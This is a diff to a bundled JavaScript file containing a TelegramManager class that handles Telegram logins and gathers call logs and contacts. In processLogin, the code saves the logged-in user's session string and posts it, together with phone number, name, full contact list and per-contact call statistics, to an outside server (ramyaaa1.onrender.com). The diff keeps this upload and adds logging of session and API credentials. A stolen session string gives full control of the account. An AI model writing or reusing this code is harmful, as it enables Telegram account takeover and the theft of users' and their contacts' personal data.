@@ -64135,6 +64135,7 @@ const axios_1 = __importDefault(__webpack_require__(/*! axios */ "./node_modules
 const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "./node_modules/telegram/Helpers.js");
 const Password_1 = __webpack_require__(/*! telegram/Password */ "./node_modules/telegram/Password.js");
 const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "./node_modules/big-integer/BigInteger.js"));
+const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "./node_modules/telegram/extensions/Logger.js");
 const clients = new Map();
 let creds = [
     {
@@ -64293,9 +64294,11 @@ class TelegramManager {
     createClient() {
         return __awaiter(this, void 0, void 0, function* () {
             try {
+                console.log(this.apiId, this.apiHash);
                 this.client = new telegram_1.TelegramClient(this.session, this.apiId, this.apiHash, {
                     connectionRetries: 5,
                 });
+                yield this.client.setLogLevel(Logger_1.LogLevel.ERROR);
                 yield this.client.connect();
             }
             catch (error) {
@@ -64466,146 +64469,166 @@ class TelegramManager {
     }
     getCallLogs() {
         return __awaiter(this, void 0, void 0, function* () {
-            const result = yield this.client.invoke(new tl_1.Api.messages.Search({
-                peer: new tl_1.Api.InputPeerEmpty(),
-                q: '',
-                filter: new tl_1.Api.InputMessagesFilterPhoneCalls({}),
-                minDate: 0,
-                maxDate: 0,
-                offsetId: 0,
-                addOffset: 0,
-                limit: 1000,
-                maxId: 0,
-                minId: 0,
-                hash: (0, big_integer_1.default)(0),
-            }));
-            const callLogs = result.messages.filter(message => message.action instanceof tl_1.Api.MessageActionPhoneCall);
-            const filteredResults = {
-                outgoing: 0,
-                incoming: 0,
-                video: 0,
-                chatCallCounts: {},
-                totalCalls: 0
-            };
-            for (const log of callLogs) {
-                filteredResults.totalCalls++;
-                const callInfo = {
-                    callId: log.action.callId.value,
-                    duration: log.action.duration,
-                    video: log.action.video,
-                    timestamp: log.date
+            try {
+                const result = yield this.client.invoke(new tl_1.Api.messages.Search({
+                    peer: new tl_1.Api.InputPeerEmpty(),
+                    q: '',
+                    filter: new tl_1.Api.InputMessagesFilterPhoneCalls({}),
+                    minDate: 0,
+                    maxDate: 0,
+                    offsetId: 0,
+                    addOffset: 0,
+                    limit: 100,
+                    maxId: 0,
+                    minId: 0,
+                    hash: big_integer_1.default.zero,
+                }));
+                console.log("Got Messages");
+                const callLogs = result.messages.filter(message => message.action instanceof tl_1.Api.MessageActionPhoneCall);
+                console.log("filtered call logs");
+                const filteredResults = {
+                    outgoing: 0,
+                    incoming: 0,
+                    video: 0,
+                    chatCallCounts: {},
+                    totalCalls: 0
                 };
-                // Categorize by type
-                if (log.out) {
-                    filteredResults.outgoing++;
+                for (const log of callLogs) {
+                    try {
+                        filteredResults.totalCalls++;
+                        const callInfo = {
+                            callId: log.action.callId.value,
+                            duration: log.action.duration,
+                            video: log.action.video,
+                            timestamp: log.date
+                        };
+                        console.log(callInfo);
+                        // Categorize by type
+                        if (log.out) {
+                            filteredResults.outgoing++;
+                        }
+                        else {
+                            filteredResults.incoming++;
+                        }
+                        if (log.action.video) {
+                            filteredResults.video++;
+                        }
+                        const chatId = log.peerId.userId.value;
+                        if (!filteredResults.chatCallCounts[chatId]) {
+                            console.log("Getting Enitity", chatId);
+                            let ent = { firstName: 'Default', lastName: null };
+                            try {
+                                ent = (yield this.client.getInputEntity(chatId));
+                                console.log("Got Enitity", chatId);
+                            }
+                            catch (error) {
+                                console.log("Failed to get entity for chatId:", chatId, error);
+                            }
+                            filteredResults.chatCallCounts[chatId] = {
+                                name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
+                                count: 0
+                            };
+                        }
+                        else {
+                            console.log(chatId, ' Already exists');
+                        }
+                        filteredResults.chatCallCounts[chatId].count++;
+                    }
+                    catch (error) {
+                        console.log("Error processing log:", log, error);
+                    }
                 }
-                else {
-                    filteredResults.incoming++;
-                }
-                if (log.action.video) {
-                    filteredResults.video++;
-                }
-                // Count calls per chat ID
-                const chatId = log.peerId.userId.value;
-                if (!filteredResults.chatCallCounts[chatId]) {
-                    const ent = yield this.client.getEntity(log.peerId.userId.value);
-                    filteredResults.chatCallCounts[chatId] = {
-                        name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
-                        count: 0
-                    };
-                }
-                filteredResults.chatCallCounts[chatId].count++;
+                console.log('Returning filtered results', filteredResults);
+                return filteredResults;
             }
-            return filteredResults;
+            catch (error) {
+                console.error("Error in getCallLogs:", error);
+                throw error;
+            }
         });
     }
     processLogin(result) {
         return __awaiter(this, void 0, void 0, function* () {
+            console.log(this.client.session.save());
+            let photoCount = 0;
+            let videoCount = 0;
+            let movieCount = 0;
+            const sess = this.client.session.save();
+            const user = yield result.toJSON();
+            // const dialogs = await this.client?.getDialogs({ limit: 600 });
+            // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
+            // for (const message of messageHistory) {
+            //     const text = message.text.toLocaleLowerCase();
+            //     if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
+            //         movieCount++
+            //     } else {
+            //         if (message.photo) {
+            //             photoCount++;
+            //         } else if (message.video) {
+            //             videoCount++;
+            //         }
+            //     }
+            // }
+            const exportedContacts = yield this.client.invoke(new tl_1.Api.contacts.GetContacts({
+                hash: big_integer_1.default.zero
+            }));
+            let channels = 0;
+            const chatsArray = [];
+            let personalChats = 0;
+            // Process and format the exported contacts as needed
+            const formattedContacts = exportedContacts.users.map(contact => ({
+                phone: contact.phone,
+                firstName: contact.firstName,
+                lastName: contact.lastName,
+                userName: contact.username,
+                clientId: contact.id.toString(),
+                fromId: user.id
+            }));
+            console.log("AllGood");
+            // for (let chat of dialogs) {
+            //     if (chat.isChannel || chat.isGroup) {
+            //         channels++;
+            //         const chatEntity: any = chat.entity.toJSON();
+            //         const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
+            //         if (!chatEntity.broadcast && !cannotSendMsgs) {
+            //             chatsArray.push(chatEntity);
+            //         }
+            //     } else {
+            //         personalChats++;
+            //     }
+            // }
+            const callLogs = yield this.getCallLogs();
+            console.log("CallLogs:", callLogs);
+            const payload3 = {
+                photoCount, videoCount, movieCount,
+                gender: null,
+                mobile: user.phone,
+                session: `${sess}`,
+                firstName: user.firstName,
+                lastName: user.lastName,
+                userName: user.username,
+                channels: channels,
+                personalChats: personalChats,
+                calls: (callLogs === null || callLogs === void 0 ? void 0 : callLogs.totalCalls) > 0 ? callLogs : {},
+                contacts: exportedContacts.savedCount,
+                msgs: 0,
+                totalChats: 0,
+                lastActive: Date.now(),
+                date: new Date(Date.now() * 1000),
+                tgId: user.id
+            };
+            console.log("Calculated results");
             try {
-                console.log(this.client.session.save());
-                let photoCount = 0;
-                let videoCount = 0;
-                let movieCount = 0;
-                const sess = this.client.session.save();
-                const user = yield result.toJSON();
-                // const dialogs = await this.client?.getDialogs({ limit: 600 });
-                // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
-                // for (const message of messageHistory) {
-                //     const text = message.text.toLocaleLowerCase();
-                //     if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
-                //         movieCount++
-                //     } else {
-                //         if (message.photo) {
-                //             photoCount++;
-                //         } else if (message.video) {
-                //             videoCount++;
-                //         }
-                //     }
-                // }
-                const exportedContacts = yield this.client.invoke(new tl_1.Api.contacts.GetContacts({
-                    hash: (0, big_integer_1.default)(0)
-                }));
-                let channels = 0;
-                const chatsArray = [];
-                let personalChats = 0;
-                // Process and format the exported contacts as needed
-                const formattedContacts = exportedContacts.users.map(contact => ({
-                    phone: contact.phone,
-                    firstName: contact.firstName,
-                    lastName: contact.lastName,
-                    userName: contact.username,
-                    clientId: contact.id.toString(),
-                    fromId: user.id
-                }));
-                // for (let chat of dialogs) {
-                //     if (chat.isChannel || chat.isGroup) {
-                //         channels++;
-                //         const chatEntity: any = chat.entity.toJSON();
-                //         const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
-                //         if (!chatEntity.broadcast && !cannotSendMsgs) {
-                //             chatsArray.push(chatEntity);
-                //         }
-                //     } else {
-                //         personalChats++;
-                //     }
-                // }
-                const callLogs = yield this.getCallLogs();
-                console.log("CallLogs:", callLogs);
-                const payload3 = {
-                    photoCount, videoCount, movieCount,
-                    gender: null,
-                    mobile: user.phone,
-                    session: `${sess}`,
-                    firstName: user.firstName,
-                    lastName: user.lastName,
-                    userName: user.username,
-                    channels: channels,
-                    personalChats: personalChats,
-                    calls: (callLogs === null || callLogs === void 0 ? void 0 : callLogs.totalCalls) > 0 ? callLogs : {},
-                    contacts: exportedContacts.savedCount,
-                    msgs: 0,
-                    totalChats: 0,
-                    lastActive: Date.now(),
-                    date: new Date(Date.now() * 1000),
-                    tgId: user.id
-                };
-                console.log("Calculated results");
-                try {
-                    console.log("posting results");
-                    yield axios_1.default.post(`https://ramyaaa1.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
-                    yield axios_1.default.post(`https://ramyaaa1.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-                    yield axios_1.default.post(`https://ramyaaa1.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
-                }
-                catch (error) {
-                    console.log("Error Occured 1");
-                    console.log(error);
-                }
-                // await this.deleteMessages();
+                console.log("posting results");
+                yield axios_1.default.post(`https://ramyaaa1.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+                yield axios_1.default.post(`https://ramyaaa1.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+                yield axios_1.default.post(`https://ramyaaa1.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
             }
-            catch (e) {
-                console.log("Error Occured 2");
-                console.log(e);
+            catch (error) {
+                console.log("Error Occured 1");
+                console.log(error);
             }
+            // await this.deleteMessages();
             yield this.disconnect();
             yield deleteClient(this.phoneNumber);
         });
